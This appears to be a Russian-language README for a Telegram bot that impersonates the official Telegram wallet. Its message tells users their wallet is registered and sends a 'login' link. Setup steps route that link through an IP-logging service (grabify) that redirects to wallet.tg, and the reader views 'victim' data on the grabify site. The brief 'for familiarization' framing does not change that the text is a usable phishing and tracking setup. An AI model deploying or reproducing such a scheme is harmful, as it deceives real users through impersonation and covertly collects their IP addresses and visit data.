🤍 **Telegram Wallet Phishing Bot** 🤍

🕊️ Проект для ознакомления с принципами работы веб-приложений в Telegram и безопасности 🎐

---

**📌 Описание проекта**

Данный бот имитирует официальный кошелёк Telegram. Пользователь заходит в бота, видит сообщение о том, что кошелёк уже зарегистрирован, и ему предлагается войти через специальную ссылку.

Ссылка ведёт на WebApp — встроенное приложение Telegram. При переходе по ней система фиксирует IP-адрес пользователя и другую техническую информацию.

---

**⚙️ Как это работает**

1. Пользователь открывает бота 🤖
2. Бот сообщает: «Ваш кошелёк уже зарегистрирован. Войдите, чтобы продолжить» 💳
3. Отправляется ссылка на WebApp 🔗
4. Пользователь переходит по ссылке внутри Telegram 🌐
5. Система логирует IP-адрес и данные о посещении 📊

**📋 Инструкция по настройке**

1. Переходи на сайт: https://grabify.link/
2. В поле «Enter the URL» вставляешь: https://wallet.tg/
3. В таблице Link Information находишь колонку New Url
4. Копируешь New Url и вставляешь в переменную в коде бота (внизу)
5. Внизу сайта в поле Results смотришь информацию о жертве (ОНА НЕ ПРИХОДИТ В БОТА — ТОЛЬКО НА САЙТЕ)
